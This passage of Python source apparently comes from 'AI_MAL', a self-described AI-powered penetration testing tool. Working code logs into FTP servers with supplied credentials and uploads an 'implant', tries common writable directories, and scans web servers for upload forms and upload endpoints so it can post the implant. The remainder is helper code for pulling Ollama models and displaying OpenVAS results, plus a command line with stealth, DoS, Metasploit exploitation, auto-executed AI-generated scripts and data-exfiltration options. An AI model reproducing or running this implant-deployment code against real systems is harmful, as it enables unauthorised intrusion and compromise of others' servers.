                    logger.info(f"Attempting FTP implant on {target}:{port} with {username}:{password}")
                    
                    # Log attempt
                    with open(log_file, 'a') as log:
                        log.write(f"  FTP attempt: {target}:{port} with {username}:{password}\n")
                    
                    ftp = ftplib.FTP()
                    ftp.connect(target, port, timeout=10)
                    ftp.login(username, password)
                    
                    logger.info(f"FTP login successful on {target}:{port}")
                    
                    # Try to determine current directory and if we can write to it
                    try:
                        cwd = ftp.pwd()
                        
                        # Attempt to upload the implant
                        ftp.storbinary(f'STOR {script_name}', io.BytesIO(implant_content))
                        
                        logger.info(f"Successfully uploaded implant to {target} via FTP")
                        with open(log_file, 'a') as log:
                            log.write(f"  [SUCCESS] Uploaded implant to {cwd}/{script_name}\n")
                            
                        # FTP upload succeeded, but we can't execute it directly
                        # We need another access method (like SSH) to execute it
                        with open(log_file, 'a') as log:
                            log.write(f"  [NOTE] Implant uploaded but not executed. Manual execution required.\n")
                            
                        success = True
                        
                    except Exception as e:
                        logger.debug(f"Failed to upload file via FTP: {str(e)}")
                        with open(log_file, 'a') as log:
                            log.write(f"  [ERROR] Upload failed: {str(e)}\n")
                    
                    # Try common writeable directories if primary attempt failed
                    if not success:
                        for directory in ['incoming', 'upload', 'pub', 'public', 'www', 'web', 'htdocs']:
                            try:
                                ftp.cwd(directory)
                                ftp.storbinary(f'STOR {script_name}', io.BytesIO(implant_content))
                                
                                logger.info(f"Successfully uploaded implant to {target} via FTP")
                                with open(log_file, 'a') as log:
                                    log.write(f"  [SUCCESS] Uploaded implant to {directory}/{script_name}\n")
                                    
                                success = True
                                break
                                
                            except Exception:
                                continue
                    
                    ftp.quit()
                    
                    if success:
                        return True
                    
                except Exception as e:
                    logger.debug(f"FTP implant attempt failed: {str(e)}")
                    with open(log_file, 'a') as log:
                        log.write(f"  [ERROR] {str(e)}\n")
                    
        return success
        
    async def _implant_via_http(self, target: str, open_ports: Dict[int, str],
                              implant_content: bytes, script_extension: str,
                              log_file: Path) -> bool:
        """Deploy implant via HTTP/HTTPS if web upload forms are available"""
        import aiohttp
        import re
        
        # Look for HTTP/HTTPS ports
        http_ports = [port for port, service in open_ports.items() 
                     if service.lower() in ['http', 'https', 'www', 'web'] 
                     or port in [80, 443, 8080, 8443]]
        
        if not http_ports:
            logger.debug(f"No HTTP service detected on {target}")
            return False
            
        success = False
        script_name = os.path.basename(self.implant_path)
        
        # Common web upload endpoints to try
        upload_paths = [
            '/upload.php',
            '/upload',
            '/file-upload',
            '/admin/upload.php',
            '/admin/fileupload',
            '/wp-admin/upload.php',
            '/dashboard/upload',
            '/filemanager/upload.php'
        ]
        
        # Create session for connection reuse
        async with aiohttp.ClientSession() as session:
            for port in http_ports:
                if success:
                    break
                    
                # Determine protocol (HTTP or HTTPS)
                protocol = 'https' if (port == 443 or port == 8443) else 'http'
                base_url = f"{protocol}://{target}:{port}"
                
                logger.info(f"Attempting HTTP implant on {base_url}")
                with open(log_file, 'a') as log:
                    log.write(f"  HTTP attempt: {base_url}\n")
                
                # First, scan the site for upload forms
                try:
                    async with session.get(base_url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        if response.status == 200:
                            html_content = await response.text()
                            
                            # Look for upload forms
                            upload_form_pattern = re.compile(r'<form.*?enctype="multipart/form-data".*?>', re.IGNORECASE | re.DOTALL)
                            upload_forms = upload_form_pattern.findall(html_content)
                            
                            if upload_forms:
                                form_action_pattern = re.compile(r'action="([^"]+)"', re.IGNORECASE)
                                for form in upload_forms:
                                    match = form_action_pattern.search(form)
                                    if match:
                                        upload_url = match.group(1)
                                        if not upload_url.startswith(('http://', 'https://')):
                                            upload_url = urljoin(base_url, upload_url)
                                            
                                        logger.info(f"Found upload form at {upload_url}")
                                        with open(log_file, 'a') as log:
                                            log.write(f"  Found upload form at {upload_url}\n")
                                            
                                        # Try to upload implant through the form
                                        file_field_pattern = re.compile(r'<input.*?type="file".*?name="([^"]+)"', re.IGNORECASE)
                                        match = file_field_pattern.search(form)
                                        file_field_name = match.group(1) if match else 'file'
                                        
                                        data = aiohttp.FormData()
                                        data.add_field(file_field_name, 
                                                     implant_content,
                                                     filename=script_name,
                                                     content_type='application/octet-stream')
                                        
                                        try:
                                            async with session.post(upload_url, data=data, ssl=False, 
                                                                timeout=aiohttp.ClientTimeout(total=20)) as upload_response:
                                                if upload_response.status in [200, 201, 202]:
                                                    resp_text = await upload_response.text()
                                                    
                                                    # Try to detect success indicators in response
                                                    success_patterns = ['success', 'uploaded', 'complete', 'file saved']
                                                    error_patterns = ['error', 'invalid', 'failed', 'too large']
                                                    
                                                    if any(pattern in resp_text.lower() for pattern in success_patterns) and \
                                                       not any(pattern in resp_text.lower() for pattern in error_patterns):
                                                        logger.info(f"Successfully uploaded implant to {target} via HTTP")
                                                        with open(log_file, 'a') as log:
                                                            log.write(f"  [SUCCESS] Uploaded implant via form\n")
                                                        success = True
                                                        break
                                                    else:
                                                        logger.debug("Upload form submission didn't indicate success")
                                                        with open(log_file, 'a') as log:
                                                            log.write(f"  [ERROR] Form submission response didn't indicate success\n")
                                        except Exception as e:
                                            logger.debug(f"Error submitting upload form: {str(e)}")
                                            with open(log_file, 'a') as log:
                                                log.write(f"  [ERROR] Form submission: {str(e)}\n")
                except Exception as e:
                    logger.debug(f"Error scanning for upload forms: {str(e)}")
                    with open(log_file, 'a') as log:
                        log.write(f"  [ERROR] Scanning for forms: {str(e)}\n")
                
                # If form scanning didn't work, try common upload endpoints
                if not success:
                    for path in upload_paths:
                        try:
                            upload_url = f"{base_url}{path}"
                            
                            logger.info(f"Trying upload endpoint: {upload_url}")
                            with open(log_file, 'a') as log:
                                log.write(f"  Trying upload endpoint: {upload_url}\n")
                            
                            data = aiohttp.FormData()
                            data.add_field('file', 
                                         implant_content,
                                         filename=script_name,
                                         content_type='application/octet-stream')
                            
                            async with session.post(upload_url, data=data, ssl=False, 
                                                  timeout=aiohttp.ClientTimeout(total=10)) as response:
                                if response.status in [200, 201, 202]:
                                    logger.info(f"Upload endpoint {upload_url} accepted the file")
                                    with open(log_file, 'a') as log:
                                        log.write(f"  [POTENTIAL SUCCESS] Upload endpoint {upload_url} accepted the file\n")
                                    success = True
                                    break
                        except Exception as e:
                            logger.debug(f"Error with upload endpoint {path}: {str(e)}")
        
        return success

    def _pull_ollama_model(self, model_name: str) -> bool:
        """
        Pull an Ollama model with proper progress display.
        
        Args:
            model_name: Name of the Ollama model to pull.
            
        Returns:
            bool: True if successful, False otherwise.
        """
        try:
            self.logger.info(f"Pulling Ollama model: {model_name}")
            
            # Check if model already exists
            if model_name in self.ai_manager.available_models:
                self.logger.info(f"Model {model_name} is already available")
                return True
                
            # Create a progress bar display
            with Progress(
                SpinnerColumn(),
                TextColumn("[bold blue]Pulling model [bold green]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeElapsedColumn(),
                console=console
            ) as progress:
                task = progress.add_task(f"[green]{model_name}", total=100)
                
                # Start pulling model in a subprocess
                pull_cmd = ["ollama", "pull", model_name]
                
                process = subprocess.Popen(
                    pull_cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1
                )
                
                # Parse output for progress updates
                last_progress = 0
                success_messages = ["success", "writing manifest", "verifying sha256"]
                success_detected = False
                
                for line in process.stdout:
                    # Check for success messages
                    if any(msg in line.lower() for msg in success_messages):
                        success_detected = True
                        progress.update(task, completed=100)
                        # If we detect success, break out of the loop
                        if "success" in line.lower():
                            break
                        
                    # Parse progress percentage
                    if "%" in line:
                        try:
                            # Extract percentage
                            percentage_match = re.search(r"(\d+)%", line)
                            if percentage_match:
                                current_progress = int(percentage_match.group(1))
                                # Update progress only if it increased
                                if current_progress > last_progress:
                                    progress.update(task, completed=current_progress)
                                    last_progress = current_progress
                                    
                                # If we reach 100%, consider it success
                                if current_progress == 100:
                                    success_detected = True
                        except Exception:
                            # Continue even if we can't parse the progress
                            pass
                
                # If we detected success or reached 100%, consider it done
                if success_detected or last_progress >= 95:
                    try:
                        # Give it a moment to finish up
                        time.sleep(1)
                        process.terminate()
                    except:
                        pass
                    self.logger.info(f"Successfully pulled model {model_name}")
                    return True
                    
                # Otherwise wait for process to finish with timeout
                try:
                    exit_code = process.wait(timeout=10)
                    if exit_code == 0:
                        progress.update(task, completed=100)
                        self.logger.info(f"Successfully pulled model {model_name}")
                        return True
                    else:
                        self.logger.error(f"Failed to pull model {model_name}")
                        return False
                except subprocess.TimeoutExpired:
                    # Process taking too long, terminate it
                    process.terminate()
                    self.logger.error(f"Timeout pulling model {model_name}")
                    return False
                
        except Exception as e:
            self.logger.error(f"Error pulling model {model_name}: {str(e)}")
            return False

    async def _pull_ollama_model_async(self, model_name: str, progress_callback=None) -> bool:
        """
        Pull an Ollama model asynchronously with progress updates.
        
        Args:
            model_name: Name of the Ollama model to pull.
            progress_callback: Optional callback function for progress updates.
            
        Returns:
            bool: True if successful, False otherwise.
        """
        try:
            logger.info(f"Pulling Ollama model asynchronously: {model_name}")
            
            # Create process
            process = await asyncio.create_subprocess_exec(
                "ollama", "pull", model_name,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT
            )
            
            # Track progress
            last_progress = 0
            success_messages = ["success", "writing manifest", "verifying sha256"]
            success_detected = False
            
            async for line in process.stdout:
                line_str = line.decode().strip()
                
                # Check for success messages
                if any(msg in line_str.lower() for msg in success_messages):
                    success_detected = True
                    if progress_callback:
                        progress_callback(model_name, 100)
                    # If we detect the final success message, break out of the loop
                    if "success" in line_str.lower():
                        break
                
                # Parse progress percentage
                if "%" in line_str:
                    try:
                        # Extract percentage
                        percentage_match = re.search(r"(\d+)%", line_str)
                        if percentage_match:
                            current_progress = int(percentage_match.group(1))
                            # Update progress only if it increased
                            if current_progress > last_progress:
                                if progress_callback:
                                    progress_callback(model_name, current_progress)
                                last_progress = current_progress
                                
                            # If we reach 100%, consider it success
                            if current_progress == 100:
                                success_detected = True
                    except Exception:
                        # Continue even if we can't parse the progress
                        pass
                
                # Log manifest errors but continue
                if "Error" in line_str and "manifest" in line_str:
                    logger.warning(f"Manifest error for {model_name}: {line_str}")
                    # These errors are sometimes transient, so continue
            
            # If we detected success or reached high progress, consider it done
            if success_detected or last_progress >= 95:
                try:
                    # Give it a moment to finish up
                    await asyncio.sleep(1)
                    process.terminate()
                except:
                    pass
                logger.info(f"Successfully pulled model {model_name}")
                return True
                
            # Otherwise wait for process to finish with timeout
            try:
                exit_code = await asyncio.wait_for(process.wait(), timeout=10)
                if exit_code == 0:
                    logger.info(f"Successfully pulled model {model_name}")
                    return True
                else:
                    logger.error(f"Failed to pull model {model_name}")
                    return False
            except asyncio.TimeoutError:
                # Process taking too long, terminate it
                process.terminate()
                logger.error(f"Timeout pulling model {model_name}")
                return False
                
        except Exception as e:
            logger.error(f"Error pulling model {model_name}: {str(e)}")
            return False

    async def pull_models(self, models: List[str]) -> Dict[str, bool]:
        """Pull multiple Ollama models with progress tracking.
        
        Args:
            models: List of model names to pull.
            
        Returns:
            Dictionary mapping model names to success status.
        """
        results = {}
        available_models = await list_ollama_models()
        
        # Create progress display
        progress_display = Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TimeElapsedColumn(),
            console=console
        )
        
        tasks = {}
        async with progress_display:
            for model in models:
                if not model:
                    results[model] = False
                    continue
                    
                if model in available_models:
                    logger.info(f"Model {model} is already available")
                    results[model] = True
                    continue
                
                # Create task for this model
                task_id = progress_display.add_task(f"[green]{model}", total=100)
                tasks[model] = task_id
                
                # Define progress callback
                def update_progress(model_name, progress):
                    if model_name in tasks:
                        progress_display.update(tasks[model_name], completed=progress)
                
                # Pull model in background
                logger.info(f"Pulling model {model}...")
                try:
                    # Use subprocess directly for more control
                    process = await asyncio.create_subprocess_exec(
                        "ollama", "pull", model,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.STDOUT
                    )
                    
                    # Track progress
                    last_progress = 0
                    success_detected = False
                    
                    async for line in process.stdout:
                        line_str = line.decode().strip()
                        
                        # Check for success message
                        if "success" in line_str.lower() or "writing manifest" in line_str.lower():
                            success_detected = True
                            update_progress(model, 100)
                            break
                        
                        # Parse progress percentage
                        if "%" in line_str:
                            try:
                                # Extract percentage
                                percentage_match = re.search(r"(\d+)%", line_str)
                                if percentage_match:
                                    current_progress = int(percentage_match.group(1))
                                    # Update progress only if it increased
                                    if current_progress > last_progress:
                                        update_progress(model, current_progress)
                                        last_progress = current_progress
                                        
                                    # If we reach 100%, the model is likely pulled
                                    if current_progress == 100:
                                        success_detected = True
                            except Exception:
                                # Continue even if we can't parse the progress
                                pass
                        
                        # Log manifest errors but continue
                        if "Error" in line_str and "manifest" in line_str:
                            logger.warning(f"Manifest error for {model}: {line_str}")
                            # These errors are sometimes transient, so continue
                    
                    # If we detected success but process is still running, terminate it
                    if success_detected:
                        try:
                            process.terminate()
                            await asyncio.sleep(0.5)  # Give it a moment to terminate
                        except:
                            pass
                        logger.info(f"Successfully pulled model {model}")
                        results[model] = True
                    else:
                        # Wait a bit for process to complete
                        try:
                            exit_code = await asyncio.wait_for(process.wait(), timeout=10)
                            if exit_code == 0 or last_progress >= 95:  # Consider close to completion as success
                                logger.info(f"Successfully pulled model {model}")
                                results[model] = True
                            else:
                                logger.error(f"Failed to pull model {model} with exit code {exit_code}")
                                results[model] = False
                        except asyncio.TimeoutError:
                            # Process is taking too long to exit
                            process.terminate()
                            if last_progress >= 95:  # If we got most of the model, consider it success
                                logger.info(f"Successfully pulled model {model} (forced termination)")
                                results[model] = True
                            else:
                                logger.error(f"Failed to pull model {model} (timeout)")
                                results[model] = False
                
                except Exception as e:
                    logger.error(f"Error pulling model {model}: {str(e)}")
                    results[model] = False
                    
                    # Ensure task is marked as completed
                    if model in tasks:
                        progress_display.update(tasks[model], completed=100 if results.get(model, False) else 0, visible=False)
        
        return results

    def _check_ollama_service(self) -> bool:
        """Check if Ollama service is running and accessible."""
        try:
            async def check():
                async with aiohttp.ClientSession() as session:
                    async with session.get("http://localhost:11434/api/tags") as response:
                        return response.status == 200
            
            # Run the check
            loop = asyncio.get_event_loop()
            return loop.run_until_complete(check())
            
        except Exception as e:
            self.logger.error(f"Error checking Ollama service: {str(e)}")
            if self.verbose:
                self.logger.exception("Full exception:")
            return False

    def _get_available_models(self) -> List[str]:
        """Get list of available Ollama models."""
        try:
            async def get_models():
                async with aiohttp.ClientSession() as session:
                    async with session.get("http://localhost:11434/api/tags") as response:
                        if response.status == 200:
                            data = await response.json()
                            return [model["name"] for model in data.get("models", [])]
                        return []
            
            # Run the check
            loop = asyncio.get_event_loop()
            return loop.run_until_complete(get_models())
            
        except Exception as e:
            self.logger.error(f"Error getting available models: {str(e)}")
            if self.verbose:
                self.logger.exception("Full exception:")
            return []

    def _initialize_ai_models(self) -> None:
        """Initialize AI models for analysis."""
        try:
            # Try to pull models if needed
            if console:
                console.print("[bold cyan]Checking AI models availability...[/bold cyan]")
            
            # Check primary model
            primary_model_available = False
            if self.ai_manager.model in self.ai_manager.available_models:
                if console:
                    console.print(f"[green]Primary model '{self.ai_manager.model}' is already available[/green]")
                primary_model_available = True
            else:
                if console:
                    console.print(f"[yellow]Primary model '{self.ai_manager.model}' needs to be pulled[/yellow]")
                # Pull primary model with progress bar
                primary_model_available = self._pull_ollama_model(self.ai_manager.model)
                if primary_model_available:
                    if console:
                        console.print(f"[green]Successfully pulled primary model '{self.ai_manager.model}'[/green]")
                else:
                    if console:
                        console.print(f"[red]Failed to pull primary model '{self.ai_manager.model}'[/red]")
            
            # Check fallback model
            fallback_model_available = False
            if primary_model_available and self.ai_manager.model == self.ai_manager.fallback_model:
                # Don't pull the same model twice
                fallback_model_available = True
            elif self.ai_manager.fallback_model in self.ai_manager.available_models:
                if console:
                    console.print(f"[green]Fallback model '{self.ai_manager.fallback_model}' is already available[/green]")
                fallback_model_available = True
            else:
                if console:
                    console.print(f"[yellow]Fallback model '{self.ai_manager.fallback_model}' needs to be pulled[/yellow]")
                # Pull fallback model with progress bar
                fallback_model_available = self._pull_ollama_model(self.ai_manager.fallback_model)
                if fallback_model_available:
                    if console:
                        console.print(f"[green]Successfully pulled fallback model '{self.ai_manager.fallback_model}'[/green]")
                else:
                    if console:
                        console.print(f"[red]Failed to pull fallback model '{self.ai_manager.fallback_model}'[/red]")
            
            # Update available models list
            self.ai_manager.available_models = self.ai_manager._get_available_models()
            
            if not primary_model_available and not fallback_model_available:
                self.logger.error("Failed to initialize AI models - check Ollama installation")
                if console:
                    console.print("[bold red]Failed to initialize AI models - check Ollama installation[/bold red]")
            else:
                available_models = []
                if primary_model_available:
                    available_models.append(self.ai_manager.model)
                if fallback_model_available and self.ai_manager.model != self.ai_manager.fallback_model:
                    available_models.append(self.ai_manager.fallback_model)
                    
                self.logger.info(f"AI models initialized successfully: {', '.join(available_models)}")
                if console:
                    console.print(f"[bold green]AI models initialized successfully: {', '.join(available_models)}[/bold green]")
        except Exception as e:
            self.logger.error(f"Error initializing AI models: {str(e)}")
            if console:
                console.print(f"[bold red]Error initializing AI models: {str(e)}[/bold red]")

async def check_and_pull_ollama_models(models: List[str]) -> Dict[str, bool]:
    """
    Check if specified models are available in Ollama and pull them if not
    
    Args:
        models: List of model names to check and pull
        
    Returns:
        Dictionary with model names as keys and availability as values
    """
    results = {}
    available_models = []
    
    # Check what models are available
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("http://localhost:11434/api/tags") as response:
                if response.status != 200:
                    logger.warning(f"Ollama API not available: {response.status}")
                    return {model: False for model in models}
                
                data = await response.json()
                available_models = [model["name"] for model in data.get("models", [])]
                logger.debug(f"Available models: {available_models}")
    except Exception as e:
        logger.warning(f"Failed to check Ollama models: {str(e)}")
        return {model: False for model in models}
    
    # Return early if all models are already available
    if all(model in available_models for model in models if model):
        return {model: True for model in models if model}
    
    # Create a progress display
    progress_display = Progress(
        SpinnerColumn(),
        TextColumn("[bold blue]Pulling model [bold green]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeElapsedColumn()
    )

    # Check and pull missing models
    tasks = {}
    async with progress_display:
        for model in models:
            if not model:
                results[model] = False
                continue
                
            if model in available_models:
                logger.info(f"Model {model} is already available")
                results[model] = True
                continue
            
            # Create task for this model
            task_id = progress_display.add_task(f"[green]{model}", total=100)
            tasks[model] = task_id
            
            # Define progress callback
            def update_progress(model_name, progress):
                if model_name in tasks:
                    progress_display.update(tasks[model_name], completed=progress)
            
            # Pull model in background
            logger.info(f"Pulling model {model}...")
            try:
                # Use subprocess directly for more control
                process = await asyncio.create_subprocess_exec(
                    "ollama", "pull", model,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT
                )
                
                # Track progress
                last_progress = 0
                success_detected = False
                
                async for line in process.stdout:
                    line_str = line.decode().strip()
                    
                    # Check for success message
                    if "success" in line_str.lower() or "writing manifest" in line_str.lower():
                        success_detected = True
                        update_progress(model, 100)
                        break
                    
                    # Parse progress percentage
                    if "%" in line_str:
                        try:
                            # Extract percentage
                            percentage_match = re.search(r"(\d+)%", line_str)
                            if percentage_match:
                                current_progress = int(percentage_match.group(1))
                                # Update progress only if it increased
                                if current_progress > last_progress:
                                    update_progress(model, current_progress)
                                    last_progress = current_progress
                                    
                                # If we reach 100%, the model is likely pulled
                                if current_progress == 100:
                                    success_detected = True
                        except Exception:
                            # Continue even if we can't parse the progress
                            pass
                    
                    # Log manifest errors but continue
                    if "Error" in line_str and "manifest" in line_str:
                        logger.warning(f"Manifest error for {model}: {line_str}")
                        # These errors are sometimes transient, so continue
                
                # If we detected success but process is still running, terminate it
                if success_detected:
                    try:
                        process.terminate()
                        await asyncio.sleep(0.5)  # Give it a moment to terminate
                    except:
                        pass
                    logger.info(f"Successfully pulled model {model}")
                    results[model] = True
                else:
                    # Wait a bit for process to complete
                    try:
                        exit_code = await asyncio.wait_for(process.wait(), timeout=10)
                        if exit_code == 0 or last_progress >= 95:  # Consider close to completion as success
                            logger.info(f"Successfully pulled model {model}")
                            results[model] = True
                        else:
                            logger.error(f"Failed to pull model {model} with exit code {exit_code}")
                            results[model] = False
                    except asyncio.TimeoutError:
                        # Process is taking too long to exit
                        process.terminate()
                        if last_progress >= 95:  # If we got most of the model, consider it success
                            logger.info(f"Successfully pulled model {model} (forced termination)")
                            results[model] = True
                        else:
                            logger.error(f"Failed to pull model {model} (timeout)")
                            results[model] = False
            
            except Exception as e:
                logger.error(f"Error pulling model {model}: {str(e)}")
                results[model] = False
            
            # Ensure task is marked as completed
            if model in tasks:
                progress_display.update(tasks[model], completed=100 if results.get(model, False) else 0, visible=False)
    
    return results

async def list_ollama_models() -> List[str]:
    """
    Get a list of available Ollama models.
    
    Returns:
        List of model names.
    """
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get("http://localhost:11434/api/tags") as response:
                if response.status != 200:
                    logger.warning(f"Ollama API not available: {response.status}")
                    return []
                
                data = await response.json()
                models = [model["name"] for model in data.get("models", [])]
                return models
    except Exception as e:
        logger.warning(f"Failed to check Ollama models: {str(e)}")
        return []

async def run_openvas_scan(self, target: str, scan_name: str = None, 
                         scan_config: str = "full_and_fast") -> Dict[str, Any]:
    """
    Run an OpenVAS vulnerability scan against the target.
    
    Args:
        target: Target IP address or hostname
        scan_name: Optional name for the scan
        scan_config: Scan configuration type
        
    Returns:
        Dictionary with scan results
    """
    try:
        self.logger.info(f"Starting OpenVAS scan against {target}")
        
        # Check OpenVAS status
        status = await self.openvas_manager.check_openvas_status()
        if not status["installed"]:
            self.logger.error("OpenVAS is not installed")
            return {"error": "OpenVAS is not installed"}
        
        # Start OpenVAS if not running
        if not status["openvas_running"]:
            self.logger.info("OpenVAS is not running, attempting to start services")
            if not await self.openvas_manager.start_openvas_services():
                self.logger.error("Failed to start OpenVAS services")
                return {"error": "Failed to start OpenVAS services"}
        
        # Run the scan
        results = await self.openvas_manager.scan(
            target=target,
            scan_name=scan_name,
            scan_config=scan_config
        )
        
        # Process results with AI if enabled
        if self.ai_analysis and "error" not in results:
            self.logger.info("Performing AI analysis of OpenVAS results")
            
            # Convert OpenVAS results to AI_MAL format
            ai_mal_scan_data = {
                "scan_info": {
                    "target": target,
                    "scan_type": "vulnerability",
                    "timestamp": datetime.now().isoformat()
                },
                "hosts": results.get("hosts", []),
                "vulnerabilities": results.get("vulnerabilities", [])
            }
            
            # Run AI analysis
            analysis = self.ai_manager.analyze_results(ai_mal_scan_data)
            if analysis:
                results["ai_analysis"] = analysis
                
        return results
        
    except Exception as e:
        self.logger.error(f"Error during OpenVAS scan: {str(e)}")
        if self.verbose:
            self.logger.exception("Full exception:")
        return {"error": f"Error during OpenVAS scan: {str(e)}"}

def _display_openvas_results(self, results: Dict[str, Any]) -> None:
    """
    Display OpenVAS scan results in a formatted way.
    
    Args:
        results: Dictionary with OpenVAS scan results
    """
    if not results or "error" in results:
        self.logger.warning(f"No valid OpenVAS results to display: {results.get('error', 'Unknown error')}")
        return
    
    if not RICH_AVAILABLE or not console:
        # Fallback to simple text output if rich is not available
        self.logger.info(f"OpenVAS scan results for {results.get('target', 'unknown target')}")
        self.logger.info(f"Scan time: {results.get('scan_start', 'unknown')} to {results.get('scan_end', 'unknown')}")
        self.logger.info(f"Total vulnerabilities found: {len(results.get('vulnerabilities', []))}")
        
        # Display high severity vulnerabilities
        high_vulns = [v for v in results.get('vulnerabilities', []) if v.get('severity', 0) >= 7.0]
        self.logger.info(f"High severity vulnerabilities: {len(high_vulns)}")
        for vuln in high_vulns:
            self.logger.info(f"- {vuln.get('name', 'Unknown')} (Severity: {vuln.get('severity', 'Unknown')})")
            self.logger.info(f"  Host: {vuln.get('host', 'Unknown')}, Port: {vuln.get('port', 'Unknown')}")
        
        return
    
    # Rich console output
    # Display scan header
    console.print(Panel(
        f"[bold cyan]OpenVAS Vulnerability Scan Results[/bold cyan]\n"
        f"[yellow]Target:[/yellow] {results.get('target', 'unknown')}\n"
        f"[yellow]Scan Configuration:[/yellow] {results.get('scan_config', 'unknown')}\n"
        f"[yellow]Scan Time:[/yellow] {results.get('scan_start', 'unknown')} to {results.get('scan_end', 'unknown')}"
    ))
    
    # Display vulnerabilities by severity
    vulnerabilities = results.get('vulnerabilities', [])
    
    # Group vulnerabilities by severity
    critical_vulns = [v for v in vulnerabilities if v.get('severity', 0) >= 9.0]
    high_vulns = [v for v in vulnerabilities if 7.0 <= v.get('severity', 0) < 9.0]
    medium_vulns = [v for v in vulnerabilities if 4.0 <= v.get('severity', 0) < 7.0]
    low_vulns = [v for v in vulnerabilities if v.get('severity', 0) < 4.0]
    
    # Display vulnerability summary
    console.print("\n[bold]Vulnerability Summary:[/bold]")
    summary_table = Table(show_header=True, header_style="bold", box=ROUNDED)
    summary_table.add_column("Severity", style="cyan")
    summary_table.add_column("Count", style="yellow")
    
    summary_table.add_row("Critical", f"[bold red]{len(critical_vulns)}[/bold red]")
    summary_table.add_row("High", f"[bold orange]{len(high_vulns)}[/bold orange]")
    summary_table.add_row("Medium", f"[bold yellow]{len(medium_vulns)}[/bold yellow]")
    summary_table.add_row("Low", f"[green]{len(low_vulns)}[/green]")
    summary_table.add_row("Total", f"[bold]{len(vulnerabilities)}[/bold]")
    
    console.print(summary_table)
    
    # Display critical vulnerabilities
    if critical_vulns:
        console.print("\n[bold red]Critical Vulnerabilities:[/bold red]")
        for vuln in critical_vulns:
            console.print(Panel(
                f"[bold]{vuln.get('name', 'Unknown')}[/bold]\n"
                f"[cyan]Severity:[/cyan] [bold red]{vuln.get('severity', 'Unknown')}[/bold red]\n"
                f"[cyan]Host:[/cyan] {vuln.get('host', 'Unknown')}\n"
                f"[cyan]Port:[/cyan] {vuln.get('port', 'Unknown')}\n"
                f"[cyan]Description:[/cyan] {vuln.get('description', 'No description available')[:200]}...\n"
                f"[cyan]Solution:[/cyan] {vuln.get('solution', 'No solution available')[:200]}...",
                expand=False
            ))
    
    # Display high vulnerabilities (limited to first 5)
    if high_vulns:
        console.print("\n[bold orange]High Vulnerabilities (top 5):[/bold orange]")
        for vuln in high_vulns[:5]:
            console.print(Panel(
                f"[bold]{vuln.get('name', 'Unknown')}[/bold]\n"
                f"[cyan]Severity:[/cyan] [bold orange]{vuln.get('severity', 'Unknown')}[/bold orange]\n"
                f"[cyan]Host:[/cyan] {vuln.get('host', 'Unknown')}\n"
                f"[cyan]Port:[/cyan] {vuln.get('port', 'Unknown')}",
                expand=False
            ))
    
    # Display AI analysis if available
    if "ai_analysis" in results:
        analysis = results["ai_analysis"]
        console.print("\n[bold magenta]AI Analysis:[/bold magenta]")
        console.print(Panel(
            f"[bold]Risk Level:[/bold] {analysis.get('risk_level', 'UNKNOWN')}\n"
            f"[bold]Summary:[/bold] {analysis.get('summary', 'No summary available')}",
            expand=False
        ))
        
        if "recommendations" in analysis:
            console.print("\n[bold cyan]Recommendations:[/bold cyan]")
            for i, rec in enumerate(analysis["recommendations"], 1):
                console.print(f"{i}. {rec}")
    
    # Display report file path if available
    if "report_file" in results:
        console.print(f"\n[bold green]Full report saved to:[/bold green] {results['report_file']}")

def main():
    """Main entry point for the AI_MAL command line tool."""
    parser = argparse.ArgumentParser(description="AI_MAL - AI-Powered Penetration Testing Tool")
    
    # Target argument (required)
    parser.add_argument("target", nargs="?", help="Target IP address or hostname")
    
    # Scan mode options
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode for minimal detection")
    parser.add_argument("--continuous", action="store_true", help="Run continuous scanning")
    parser.add_argument("--delay", type=int, default=300, help="Delay between scans in seconds (default: 300)")
    
    # Service detection options
    parser.add_argument("--services", action="store_true", help="Enable service detection")
    parser.add_argument("--version", action="store_true", help="Enable version detection")
    parser.add_argument("--os", action="store_true", help="Enable OS detection")
    parser.add_argument("--vuln", action="store_true", help="Enable vulnerability scanning")
    parser.add_argument("--dos", action="store_true", help="Enable DoS testing")
    
    # Metasploit integration
    parser.add_argument("--msf", action="store_true", help="Enable Metasploit integration")
    parser.add_argument("--exploit", action="store_true", help="Attempt exploitation of vulnerabilities")
    
    # Custom script generation
    parser.add_argument("--custom-scripts", action="store_true", help="Enable AI-powered script generation")
    parser.add_argument("--script-type", choices=["python", "bash", "ruby"], default="python", 
                      help="Script language (python/bash/ruby)")
    parser.add_argument("--execute-scripts", action="store_true", help="Automatically execute generated scripts")
    parser.add_argument("--script-output", default="./scripts", help="Output directory for generated scripts")
    parser.add_argument("--script-format", choices=["raw", "base64"], default="raw", help="Script format (raw/base64)")
    
    # AI analysis options
    parser.add_argument("--ai-analysis", action="store_true", default=True, help="Enable AI analysis of results")
    parser.add_argument("--model", default=os.getenv('OLLAMA_MODEL', 'artifish/llama3.2-uncensored'), 
                      help="Primary AI model")
    parser.add_argument("--fallback-model", default=os.getenv('OLLAMA_FALLBACK_MODEL', 'gemma:1b'), 
                      help="Fallback AI model")
    
    # Advanced features
    parser.add_argument("--exfil", action="store_true", help="Enable data exfiltration")
    parser.add_argument("--implant", help="Path to implant script")
    
    # Output options
    parser.add_argument("--output-dir", default="./results", help="Output directory for results")
    parser.add_argument("--output-format", choices=["xml", "json"], default="json", help="Output format (xml/json)")
    parser.add_argument("--quiet", action="store_true", help="Suppress progress output")
    parser.add_argument("--no-gui", action="store_true", help="Disable terminal GUI features")
    
    # Logging options
    parser.add_argument("--log-level", choices=["debug", "info", "warning", "error"], default="info", 
                      help="Logging level")
    parser.add_argument("--log-file", default="logs/AI_MAL.log", help="Log file path")
    
    # Automation options
    parser.add_argument("--full-auto", action="store_true", help="Enable full automation mode")
    parser.add_argument("--custom-vuln", help="Path to custom vulnerability definitions")
    
    args = parser.parse_args()
    
